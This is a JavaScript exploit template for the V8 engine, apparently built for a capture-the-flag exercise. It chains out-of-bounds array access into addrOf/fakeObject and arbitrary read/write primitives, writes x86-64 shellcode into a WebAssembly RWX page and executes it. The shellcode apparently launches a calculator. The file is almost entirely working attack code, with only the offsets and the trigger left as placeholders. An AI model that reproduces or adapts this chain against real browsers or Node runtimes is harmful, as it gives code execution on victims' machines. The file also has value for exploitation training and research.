///////////////////////////////////////////////////////////// Offsets Needed for Exploit ////////////////////////////////////////////////////////////

DEBUG = false;

TRIGGERED_INDEX_OF_OOB_LENGTH = 0;

OOB_INDEX_OF_VICTIM_SLOT = 0;
VICTIM_INDEX = 0;

OOB_INDEX_OF_ARBRW_ELEMENTS = 0;

WASM_PAGE_OFFSET = 0x0n;

////////////////////////// Create base WebAssembly Module (credit: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/) //////////////////////////

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_func = wasm_instance.exports.main;

// https://xz.aliyun.com/t/5003 (tested on ubuntu 20.04)
var shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e, 0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];

/////////////////////////// Helper Functions (credit: https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/) ///////////////////////////

let ab = new ArrayBuffer(8);
let fv = new Float64Array(ab);
let dv = new BigUint64Array(ab);

// Float to Integer
function f2i(f) {
	fv[0] = f;
	return dv[0];
}

// Integer to Float
function i2f(i) {
	dv[0] = BigInt(i);
	return fv[0];
}

// Integer to Tagged Integer
function tagInt(i) {
	return i | 1n;
}

// Tagged Integer to Integer
function untagInt(i) {
	return i & ~1n;
}

// Float to Tagged Float
function tagFloat(f) {
	fv[0] = f;
	dv[0] += 1n;
	return fv[0];
}

// Tagged Float to Float
function untagFloat(f) {
	fv[0] = f;
	dv[0] -= 1n;
	return fv[0];
}

// Float to double word hex
function hexprintablef(f) {
	return (f2i(f)).toString(16).padStart(16, "0");
}

// Integer to double word hex
function hexprintablei(i) {
	return (i).toString(16).padStart(16, "0");
}

// Float to word hex
function hexprintablefp(f) {
	return (lowerhalf(f2i(f))).toString(16).padStart(8, "0");
}

// Integer to word hex
function hexprintableip(i) {
	return (lowerhalf(i)).toString(16).padStart(8, "0");
}

function upperhalf(i) {
	return i / 0x100000000n;
}

function lowerhalf(i) {
	return i % 0x100000000n;

}

function shift32(i) {
	return i << 32n;
}

/////////////////////////////////////////////////////////////// Array Length Extension //////////////////////////////////////////////////////////////

function newArrayLen(new_len) {
	old_len = triggered[TRIGGERED_INDEX_OF_OOB_LENGTH];
	triggered[TRIGGERED_INDEX_OF_OOB_LENGTH] = new_len;
	
	if (DEBUG) {
		if (oob.length != new_len) {
			console.log("Length change unsuccessful");
		} else {
			console.log("Length changed from " + old_len + " to " + new_len);
		}
	}
	
	return old_len;
}

/////////////////////////////////////////////////////////// AddrOf / FakeObject Primitives //////////////////////////////////////////////////////////

function addrOf(o) {
	// swap objects
	old_object = victim[VICTIM_INDEX];
	victim[VICTIM_INDEX] = o;

	// read the object's address
	obj_addr = lowerhalf(untagInt(f2i(oob[OOB_INDEX_OF_VICTIM_SLOT])));
	
	// restore object
	victim[VICTIM_INDEX] = old_object;
	
	if (DEBUG) {
		console.log("Address we got: " + hexprintableip(obj_addr));
		console.log("Debug info for object");
		%DebugPrint(o);
	}
	
	return obj_addr;
}

function fakeObject(addr) {
	if (DEBUG) {
		obj_addr = untagInt(lowerhalf(f2i(oob[OOB_INDEX_OF_VICTIM_SLOT])));
		console.log("Old object address for element " + VICTIM_INDEX + ": " + hexprintableip(obj_addr));
		console.log("Debug info for victim before overwrite");
		%DebugPrint(victim);	// check addresses of elements
	}
	
	// store fake object in victim array
	new_addr = tagInt(addr);
	oob[OOB_INDEX_OF_VICTIM_SLOT] = i2f(new_addr);
	
	if (DEBUG) {
		console.log("Debug info for victim after overwrite");
		%DebugPrint(victim);	// check addresses of elements
	}
	
	return victim[VICTIM_INDEX];
}

////////////////////////////////////////////////////////////// Arbitrary R/W Primitives /////////////////////////////////////////////////////////////

function arb_read(addr) {
	if (DEBUG) {
		console.log("Old length: " + arb_rw.length);
	}
	
	elements_addr = f2i(oob[OOB_INDEX_OF_ARBRW_ELEMENTS]);	// found from for loop
	elements_addr_upper = upperhalf(elements_addr);	// get upper 32 bits (size of backing store, modify this to extend reads/writes)
	elements_addr_lower = lowerhalf(elements_addr);	// get lower 32 bits
	new_elements_addr = shift32(elements_addr_upper * 2n) + tagInt(addr - 8n);	// don't need to increase length here, but you can
	oob[OOB_INDEX_OF_ARBRW_ELEMENTS] = i2f(new_elements_addr);
	
	if (DEBUG) {
		console.log("New length: " + arb_rw.length);	// verify the length is 2x original
	}
	
	val = f2i(arb_rw[0]);
	
	oob[OOB_INDEX_OF_ARBRW_ELEMENTS] = i2f(elements_addr);	// restore old address and length
	if (DEBUG) {
		%DebugPrint(arb_rw);	// verify we fixed this properly
	}
	
	return val;
}

function arb_write(addr, val) {
	if (DEBUG) {
		console.log("Old length: " + arb_rw.length);
	}
	
	elements_addr = f2i(oob[OOB_INDEX_OF_ARBRW_ELEMENTS]);	// found from for loop
	elements_addr_upper = upperhalf(elements_addr);	// get upper 32 bits (size of backing store, modify this to extend reads/writes)
	elements_addr_lower = lowerhalf(elements_addr);	// get lower 32 bits
	new_elements_addr = shift32(elements_addr_upper * 2n) + tagInt(addr - 8n);	// don't need to increase length here, but you can
	oob[OOB_INDEX_OF_ARBRW_ELEMENTS] = i2f(new_elements_addr);
	
	if (DEBUG) {
		console.log("New length: " + arb_rw.length);	// verify the length is 2x original
	}
	
	arb_rw[0] = i2f(val)
	
	oob[OOB_INDEX_OF_ARBRW_ELEMENTS] = i2f(elements_addr);	// restore old address and length
	if (DEBUG) {
		%DebugPrint(arb_rw);	// verify we fixed this properly
	}
}

///////////////////////////////////////////////////////// Function to Trigger Vulnerability /////////////////////////////////////////////////////////

function trigger() {
	array = [1]; // create OOB on this
	return [array, [1.1], [{}, {}, {}, {}], [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]];
};

///////////////////////////////////////////////////////// Function to Trigger Vulnerability /////////////////////////////////////////////////////////

for (let i = 0; i < 50000; ++i) {
	trigger();
}

//////////////////////////////////////////////////////// Create Global Arrays for Primitives ////////////////////////////////////////////////////////

var arrays = trigger();
var triggered = arrays[0];
var oob = arrays[1];
var victim = arrays[2];
var arb_rw = arrays[3];

arrays = trigger();

newArrayLen(0x1000);

////////////////////// Use Primitives to Overwrite WASM Page (credit: https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/) //////////////////////

// get address of RWX memory
rwx_page_addr = arb_read(tagInt(addrOf(wasm_instance)) + WASM_PAGE_OFFSET);

if (DEBUG) {
	console.log("RWX page: " + hexprintablei(rwx_page_addr));
	console.log("Debug info for wasm_instance");
	%DebugPrint(wasm_instance);
}

// create dataview for easy memory writing
let buf = new ArrayBuffer(shellcode.length * 4);
let dataview = new DataView(buf);

// move dataview to RWX memory
let buf_addr = addrOf(buf);
let backing_store_addr = buf_addr + 0x14n;
arb_write(tagInt(backing_store_addr), rwx_page_addr);

// copy shellcode
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
	
// jump to RWX memory
wasm_func();
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
